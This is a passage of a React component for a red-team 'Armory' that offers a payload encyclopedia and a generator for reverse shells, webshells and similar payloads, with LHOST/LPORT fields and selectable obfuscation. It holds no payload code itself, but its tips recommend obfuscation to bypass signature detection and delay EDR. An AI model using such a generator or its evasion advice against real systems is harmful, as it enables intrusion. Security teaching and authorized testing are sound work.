    a.href = url
    const ext = FORMAT_EXTENSIONS[format] || 'txt'
    a.download = `${selectedPayload}_${format}.${ext}`
    a.click()
    URL.revokeObjectURL(url)
  }

  const generate = () => {
    if (currentPayloadInfo.requiresLhost && lhost.trim() === '') {
      setLhostError('LHOST is required for this payload')
      return
    }
    if (currentPayloadInfo.requiresLport && (lport < 1 || lport > 65535)) {
      setLportError('Valid port (1-65535) is required')
      return
    }
    const payload = generatePayloadCode(selectedPayload, format, lhost, lport, obfuscation)
    setGeneratedPayload(payload)
  }

  const handleSelectAll = () => {
    if (!manualCopyRef.current) return
    const range = document.createRange()
    range.selectNodeContents(manualCopyRef.current)
    const sel = window.getSelection()
    sel?.removeAllRanges()
    sel?.addRange(range)
  }

  useEffect(() => {
    if (copyStatus === 'manual' && manualCopyRef.current) {
      handleSelectAll()
      manualCopyRef.current.focus()
    }
  }, [copyStatus])

  const toggleExpand = (type: PayloadType) => {
    setExpandedPayloads(prev => {
      const next = new Set(prev)
      if (next.has(type)) {
        next.delete(type)
      } else {
        next.add(type)
        if (next.size > 10) {
          const first = next.values().next().value
          if (first !== undefined) {
            next.delete(first)
          }
        }
      }
      return next
    })
  }

  const payloadCategories = useMemo(() => {
    const groups: Record<string, PayloadInfo[]> = {}
    PAYLOAD_ENCYCLOPEDIA.forEach(p => {
      if (!groups[p.category]) groups[p.category] = []
      groups[p.category].push(p)
    })
    return groups
  }, [])

  const inputClass = "w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:border-red-500/30 placeholder-white/20"
  const selectClass = "w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:border-red-500/30"

  return (
    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
      
      {/* ── Header ── */}
      <div className="flex items-center justify-between px-8 py-4 border-b border-white/5 flex-wrap gap-2">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-xl flex items-center justify-center border border-red-500/20" style={{ background: 'radial-gradient(circle, rgba(239,68,68,0.18), rgba(239,68,68,0.04))' }}>
            <Swords size={16} className="text-red-400" />
          </div>
          <div>
            <span className="text-white font-bold text-base">Armory</span>
            <div className="text-white/40 text-xs">Generate + Understand Red Team Payloads</div>
          </div>
        </div>
        <div className="flex gap-2">
          <div className="flex bg-white/5 border border-white/10 rounded-xl p-0.5">
            <button
              onClick={() => setActiveTab('encyclopedia')}
              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${
                activeTab === 'encyclopedia' 
                  ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
                  : 'text-white/40 hover:text-white/80'
              }`}
            >
              <BookOpen size={12} /> Encyclopedia ({PAYLOAD_ENCYCLOPEDIA.length})
            </button>
            <button
              onClick={() => setActiveTab('generator')}
              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${
                activeTab === 'generator' 
                  ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
                  : 'text-white/40 hover:text-white/80'
              }`}
            >
              <Zap size={12} /> Generator
            </button>
          </div>
        </div>
      </div>

      {/* ── Main Content ── */}
      <div className="px-8 py-6 max-w-7xl mx-auto">

        {/* PAYLOAD INFO SECTION - Collapsible */}
        <div className="mb-6">
          <button
            onClick={() => setShowPayloadInfo(!showPayloadInfo)}
            className="w-full flex items-center justify-between bg-red-500/5 border border-red-500/20 rounded-2xl px-6 py-4 hover:bg-red-500/10 transition-all group"
          >
            <div className="flex items-center gap-3">
              <div className="p-2 rounded-xl bg-red-500/20 text-red-400 group-hover:scale-110 transition-transform">
                <Swords size={18} />
              </div>
              <div className="text-left">
                <span className="text-red-400 font-bold text-sm">What is a Payload?</span>
                <span className="text-white/30 text-xs ml-3 hidden sm:inline">
                  {showPayloadInfo ? 'Click to collapse' : 'Click to expand'} — Essential knowledge for every hacker
                </span>
              </div>
            </div>
            <div className="text-white/30 group-hover:text-red-400 transition-colors">
              {showPayloadInfo ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
            </div>
          </button>
          
          {showPayloadInfo && (
            <div className="bg-white/5 border border-red-500/20 border-t-0 rounded-b-2xl p-6 space-y-4 text-xs text-white/70 leading-relaxed">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-1 h-8 bg-red-500 rounded-full"></div>
                    <h3 className="text-red-400 font-bold text-sm">What is a Payload?</h3>
                  </div>
                  <p className="text-white/50 pl-3">
                    In cybersecurity, a <span className="text-red-400 font-semibold">payload</span> is the component of a malicious 
                    program or exploit that performs the actual harmful action. It's the "cargo" delivered by an exploit's delivery 
                    mechanism (the "vector").
                  </p>
                  <div className="bg-black/30 border border-white/5 rounded-xl p-3 mt-2">
                    <code className="text-xs text-cyan-400">
                      Exploit (Vector) → Delivery → <span className="text-red-400 font-bold">Payload</span> (Action)
                    </code>
                  </div>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-1 h-8 bg-cyan-400 rounded-full"></div>
                    <h3 className="text-cyan-400 font-bold text-sm">Common Payload Types</h3>
                  </div>
                  <ul className="space-y-2 text-white/50 pl-3">
                    <li className="flex items-start gap-2">
                      <span className="text-cyan-400 mt-0.5">•</span>
                      <div><span className="text-white font-medium">Reverse Shell:</span> Target connects back to attacker</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-cyan-400 mt-0.5">•</span>
                      <div><span className="text-white font-medium">Bind Shell:</span> Target listens for incoming connection</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-cyan-400 mt-0.5">•</span>
                      <div><span className="text-white font-medium">WebShell:</span> Web-based command execution interface</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-cyan-400 mt-0.5">•</span>
                      <div><span className="text-white font-medium">Meterpreter:</span> Advanced post-exploitation framework</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-cyan-400 mt-0.5">•</span>
                      <div><span className="text-white font-medium">Shellcode:</span> Raw machine code for memory injection</div>
                    </li>
                  </ul>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-1 h-8 bg-emerald-400 rounded-full"></div>
                    <h3 className="text-emerald-400 font-bold text-sm">Best Practices</h3>
                  </div>
                  <ul className="space-y-2 text-white/50 pl-3">
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Always <span className="text-white font-medium">test</span> payloads in isolated lab environments first</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Use <span className="text-white font-medium">obfuscation</span> to bypass signature-based detection</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div><span className="text-white font-medium">Verify</span> payloads are functional before deployment</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Always have a <span className="text-white font-medium">fallback</span> listener ready</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Stay <span className="text-white font-medium">legal</span> — only test on systems you own or have permission</div>
                    </li>
                  </ul>
                </div>
              </div>

              <div className="border-t border-white/5 pt-4 mt-2">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
                    <div className="text-amber-400 font-bold mb-1">🎯 Staged vs Stageless</div>
                    <p className="text-white/50">
                      <span className="text-white">Staged:</span> Small initial payload downloads the full payload later. 
                      <span className="text-white ml-2">Stageless:</span> Everything is included in one file.
                    </p>
                  </div>
                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
                    <div className="text-amber-400 font-bold mb-1">🔒 Encryption Matters</div>
                    <p className="text-white/50">
                      Encrypted payloads (HTTPS, AES) evade network detection but require more complex listeners. 
                      <span className="text-white ml-2">Trade-off: Stealth vs Complexity.</span>
                    </p>
                  </div>
                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
                    <div className="text-amber-400 font-bold mb-1">📊 Detection Reality</div>
                    <p className="text-white/50">
                      Most payloads are <span className="text-white">detectable</span> by modern EDR. The goal is 
                      <span className="text-white ml-1">delaying detection</span> long enough to achieve objectives.
                    </p>
                  </div>
                </div>
              </div>

              <div className="text-[10px] text-white/30 text-center border-t border-white/5 pt-3">
                <span className="text-red-400">⚠️</span> This information is for <span className="text-white font-medium">educational and authorized testing</span> purposes only. 
                Unauthorized use of payloads is illegal.
              </div>
            </div>
          )}
        </div>

        {/* ── ENCYCLOPEDIA TAB ── */}
        {activeTab === 'encyclopedia' && (
          <div>
            <div className="mb-6">
              <h2 className="text-xl font-semibold text-white mb-1">Payload Encyclopedia</h2>
              <p className="text-white/40 text-sm">Learn what each payload does, when to use it, and how it works. Click on a card to expand for deep dive details.</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {PAYLOAD_ENCYCLOPEDIA.map((payload) => {
                const isExpanded = expandedPayloads.has(payload.type)
                return (
                  <div
                    key={payload.type}
                    className={`bg-white/5 border rounded-2xl p-5 transition-all cursor-pointer ${
                      isExpanded ? 'border-red-500/30 bg-red-500/5' : 'border-white/5 hover:border-red-500/20'
                    }`}
                    onClick={() => toggleExpand(payload.type)}
                  >
                    <div className="flex items-start justify-between mb-3">
                      <div className={`${payload.color} group-hover:scale-110 transition-transform`}>
                        {payload.icon}
                      </div>
                      <div className="flex items-center gap-2" onClick={e => e.stopPropagation()}>
                        <div className="text-[10px] px-2 py-0.5 rounded-full bg-white/5 border border-white/10 text-white/40">
                          {payload.supportedFormats.length} formats
                        </div>
                        {isExpanded ? <ChevronUp size={16} className="text-white/30" /> : <ChevronDown size={16} className="text-white/30" />}
                      </div>
                    </div>

                    <h3 className="text-base font-bold text-white mb-1">{payload.name}</h3>
                    <p className="text-white/50 text-xs mb-3">{payload.description}</p>

                    <div className="space-y-2 text-xs">
                      <div>
                        <div className="text-red-400 text-[10px] font-mono mb-0.5">WHAT IT DOES</div>
                        <p className="text-white/50">{payload.whatItDoes}</p>
                      </div>
                      <div>
                        <div className="text-red-400 text-[10px] font-mono mb-0.5">WHERE TO USE</div>
                        <p className="text-white/50">{payload.whereToUse}</p>
                      </div>
                    </div>

                    {isExpanded && (
                      <div className="mt-4 pt-4 border-t border-white/5 space-y-3 animate-in slide-in-from-top-4 duration-200">
                        <div>
                          <div className="text-cyan-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Lightbulb size={12} /> HOW IT WORKS</div>
                          <p className="text-xs text-white/50 leading-relaxed">{payload.howItWorks}</p>
                        </div>
                        <div>
                          <div className="text-amber-400 text-[10px] font-mono mb-0.5">EXAMPLE SCENARIO</div>
                          <p className="text-xs text-white/50">{payload.exampleScenario}</p>
                        </div>
                        <div>
                          <div className="text-emerald-400 text-[10px] font-mono mb-0.5">LISTENER COMMAND</div>
                          <code className="text-[10px] bg-black/30 px-2 py-1.5 rounded block font-mono text-emerald-400 break-all">
                            {payload.commonListenerCommand}
                          </code>
                        </div>
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <div className="text-red-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><AlertCircle size={12} /> DETECTION INDICATORS</div>
                            <ul className="text-[10px] text-white/50 list-disc list-inside space-y-0.5">
                              {payload.detectionIndicators.map((item, i) => <li key={i}>{item}</li>)}
                            </ul>
                          </div>
                          <div>
                            <div className="text-blue-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><CheckCircle size={12} /> MITIGATION TIPS</div>
                            <ul className="text-[10px] text-white/50 list-disc list-inside space-y-0.5">
                              {payload.mitigationTips.map((item, i) => <li key={i}>{item}</li>)}
                            </ul>
                          </div>
                        </div>
                        <div>
                          <div className="text-white/30 text-[10px] font-mono mb-0.5">REFERENCES</div>
                          <ul className="text-[10px] text-white/50 list-disc list-inside">
                            {renderReferences(payload.references)}
                          </ul>
                        </div>
                        {!payload.isComplete && (
                          <div className="text-[10px] text-amber-400 flex items-center gap-1">
                            <AlertCircle size={12} /> Template only — may need completion for production use
                          </div>
                        )}
                        <button
                          onClick={(e) => {
                            e.stopPropagation()
                            handlePayloadChange(payload.type)
                            setActiveTab('generator')
                          }}
                          className="text-[10px] flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-colors border border-red-500/20"
                        >
                          <Play size={12} /> Generate this payload
                        </button>
                      </div>
                    )}

                    <div className="mt-3 pt-3 border-t border-white/5 flex justify-between items-center">
                      <span className="text-[10px] text-white/30">{isExpanded ? 'Click to collapse' : 'Click for deep dive'}</span>
                      <span className="text-[10px] text-white/30 flex items-center gap-1">
                        {payload.pros.length} pros · {payload.cons.length} cons
                      </span>
                    </div>
                  </div>
                )
              })}
            </div>
          </div>
        )}

        {/* ── GENERATOR TAB ── */}
        {activeTab === 'generator' && currentPayloadInfo && (
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            <div className="xl:col-span-5 space-y-4">
              <div className="bg-white/5 border border-white/5 rounded-2xl p-5">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                    <Target size={16} className="text-red-400" /> Payload Configuration
                  </h3>
                  <button
                    onClick={() => {
                      setLhost('10.10.14.5')
                      setLport(currentPayloadInfo.defaultPort)
                      setFormat(currentPayloadInfo.supportedFormats[0])
                      setObfuscation('none')
                      setGeneratedPayload('')
                      setShowRaw(false)
                      setLhostError(null)
                      setLportError(null)
                    }}
                    className="text-[10px] text-white/40 hover:text-white/80 transition-colors"
                  >
                    Reset
                  </button>
                </div>

                <div className="mb-4">
                  <label className="text-[10px] text-white/40 block mb-1.5">Payload Type</label>
                  <select
                    value={selectedPayload}
                    onChange={(e) => handlePayloadChange(e.target.value as PayloadType)}
                    className={selectClass}
                  >
                    {Object.entries(payloadCategories).map(([category, payloads]) => (
                      <optgroup key={category} label={category}>
                        {payloads.map(p => (
                          <option key={p.type} value={p.type} style={{ background: '#0d1022' }}>{p.name}</option>
                        ))}
                      </optgroup>
                    ))}
                  </select>
                </div>

                <div className="mb-4 p-3 bg-black/30 border border-white/5 rounded-xl">
                  <div className="flex items-center gap-2 mb-2">
                    <div className={currentPayloadInfo.color}>{currentPayloadInfo.icon}</div>
                    <div>
                      <div className="text-sm font-semibold text-white">{currentPayloadInfo.name}</div>
                      <div className="text-[10px] text-white/40">{currentPayloadInfo.description}</div>
                    </div>
                  </div>
                  <div className="text-[10px] text-white/40 space-y-0.5">
                    <div><strong className="text-red-400">Where to use:</strong> {currentPayloadInfo.whereToUse}</div>
                    <div><strong className="text-red-400">How it works:</strong> <span className="italic">{currentPayloadInfo.howItWorks.slice(0, 100)}...</span></div>
                    <div><strong className="text-red-400">Listener:</strong> <code className="text-cyan-400 bg-black/30 px-1 py-0.5 rounded">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code></div>
                  </div>
                  {!currentPayloadInfo.isComplete && (
                    <div className="mt-1 text-[10px] text-amber-400 flex items-center gap-1">
                      <AlertCircle size={10} /> Template only — may need completion for production use
                    </div>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-3 mb-4">
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1">LHOST</label>
                    <input
                      type="text"
                      value={lhost}
                      onChange={(e) => handleLhostChange(e.target.value)}
                      disabled={!currentPayloadInfo.requiresLhost}
                      placeholder={currentPayloadInfo.requiresLhost ? "10.10.14.5" : "Not required"}
                      className={`${inputClass} disabled:opacity-40`}
                    />
                    {lhostError && <div className="text-[10px] text-red-400 mt-1">{lhostError}</div>}
                  </div>
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1">LPORT</label>
                    <input
                      type="number"
                      min="1"
                      max="65535"
                      value={lport}
                      onChange={(e) => handleLportChange(e.target.value)}
                      disabled={!currentPayloadInfo.requiresLport}
                      placeholder={currentPayloadInfo.requiresLport ? "4444" : "Not required"}
                      className={`${inputClass} disabled:opacity-40`}
                    />
                    {lportError && <div className="text-[10px] text-red-400 mt-1">{lportError}</div>}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1">Output Format</label>
                    <select
                      value={format}
                      onChange={(e) => setFormat(e.target.value as OutputFormat)}
                      className={selectClass}
                    >
                      {currentPayloadInfo.supportedFormats.map(f => (
                        <option key={f} value={f} style={{ background: '#0d1022' }}>{f}</option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="text-[10px] text-white/40 block mb-1">Obfuscation</label>
                    <select
                      value={obfuscation}
                      onChange={(e) => setObfuscation(e.target.value as ObfuscationLevel)}
                      className={selectClass}
                    >
                      <option value="none" style={{ background: '#0d1022' }}>None</option>
                      <option value="light" style={{ background: '#0d1022' }}>Light</option>
                      <option value="medium" style={{ background: '#0d1022' }}>Medium</option>
                      <option value="heavy" style={{ background: '#0d1022' }}>Heavy</option>
                    </select>
                    {obfuscation !== 'none' && !OBFUSCATION_SUPPORTED_FORMATS.includes(format) && (
                      <div className="text-[10px] text-amber-400 mt-1 flex items-center gap-1">
                        <AlertCircle size={10} /> Obfuscation not supported for {format}
                      </div>
                    )}
                  </div>
                </div>
              </div>

              <button
                onClick={generate}
                className="w-full py-3.5 rounded-xl font-bold text-white text-sm flex items-center justify-center gap-2 transition-all"
                style={{ background: 'linear-gradient(90deg, #dc2626, #b91c1c)' }}
              >
                Generate Payload <Zap size={14} />
              </button>
            </div>

            <div className="xl:col-span-7">
              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 h-full flex flex-col">
                <div className="flex justify-between items-center mb-3">
                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                    <Code size={14} className="text-red-400" /> Generated Payload
                  </h3>
                  {generatedPayload && (
                    <div className="flex gap-2 flex-wrap">
                      <button onClick={() => setShowRaw(!showRaw)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
                        {showRaw ? <EyeOff size={12} /> : <Eye size={12} />} {showRaw ? 'Formatted' : 'Raw'}
                      </button>
                      <button onClick={() => copyToClipboard(generatedPayload)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
                        {copyStatus === 'success' ? <><CheckCircle size={12} /> Copied!</> : 
                         copyStatus === 'error' ? <><AlertCircle size={12} /> Failed</> :
                         copyStatus === 'manual' ? <><Copy size={12} /> Select</> :
                         <><Copy size={12} /> Copy</>}
                      </button>
                      <button onClick={downloadPayload} className="text-[10px] px-2 py-1 rounded-xl bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-colors flex items-center gap-1">
                        <Download size={12} /> Download
                      </button>
                    </div>
                  )}
                </div>

                <div className="flex-1 bg-black/30 rounded-xl p-3 overflow-auto font-mono text-xs border border-white/5 min-h-[280px]">
                  {generatedPayload ? (
                    <pre className="whitespace-pre-wrap break-all text-emerald-400">
                      {showRaw ? generatedPayload : generatedPayload
                        .split('\n')
                        .map((line, i) => <div key={i} className="leading-relaxed break-all">{line || '\u00A0'}</div>)}
                    </pre>
                  ) : (
                    <div className="h-full flex items-center justify-center text-center text-white/30">
                      <div>
                        <Swords size={40} className="mx-auto mb-3 opacity-30" />
                        <p className="text-sm">Click "Generate Payload" to create your payload</p>
                      </div>
                    </div>
                  )}
                </div>

                {generatedPayload && (
                  <div className="mt-3 p-3 bg-black/30 border border-white/5 rounded-xl text-xs">
                    <div className="font-semibold text-red-400 mb-1.5 flex items-center gap-1.5">
                      <Lightbulb size={12} /> Quick Usage Guide
                    </div>
                    <p className="text-white/50">{currentPayloadInfo.howToUse}</p>
                    <div className="mt-1.5 text-[10px] text-white/40">
                      <span className="text-white">Listener:</span> <code className="bg-black/30 px-1.5 py-0.5 rounded text-emerald-400">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code>
                    </div>
                    <div className="mt-1.5 grid grid-cols-2 gap-2 text-[10px]">
                      <div className="border border-emerald-500/20 rounded p-1.5 bg-emerald-500/5">
                        <div className="text-emerald-400 font-mono text-[9px]">PROS</div>
                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5">
                          {currentPayloadInfo.pros.slice(0, 2).map((p, i) => <li key={i}>{p}</li>)}
                        </ul>
                      </div>
                      <div className="border border-red-500/20 rounded p-1.5 bg-red-500/5">
                        <div className="text-red-400 font-mono text-[9px]">CONS</div>
                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5">
                          {currentPayloadInfo.cons.slice(0, 2).map((c, i) => <li key={i}>{c}</li>)}
                        </ul>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Manual Copy Modal with Select All */}
      {copyStatus === 'manual' && (
        <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4" onClick={() => setCopyStatus('idle')}>
          <div className="bg-[#0d1022] border border-white/10 rounded-2xl p-6 max-w-2xl w-full" onClick={e => e.stopPropagation()}>
            <h3 className="text-lg font-bold text-white mb-2">Manual Copy Required</h3>
            <p className="text-sm text-white/40 mb-3">
              Tap "Select All" below, then press <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Ctrl+C</kbd> (or <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Cmd+C</kbd> on Mac, long-press → Copy on mobile).
            </p>
            <pre 
              ref={manualCopyRef}
              className="w-full h-64 bg-black/30 border border-white/5 rounded-xl p-3 font-mono text-xs overflow-auto whitespace-pre-wrap break-all select-text text-emerald-400"
            >
              {generatedPayload}
            </pre>
            <div className="flex gap-2 mt-3">
              <button
                onClick={handleSelectAll}
                className="flex-1 py-2 bg-red-500/10 text-red-400 rounded-lg text-sm font-medium hover:bg-red-500/20 border border-red-500/20 transition-colors"
              >
                Select All
              </button>
              <button onClick={() => setCopyStatus('idle')} className="px-4 py-2 text-white/40 text-sm hover:text-white transition-colors">
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar { width: 3px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
        @keyframes slideDown {
          from { opacity: 0; transform: translateY(-10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-slideDown { animation: slideDown 0.25s ease-out; }
      `}} />
    </div>
  )
}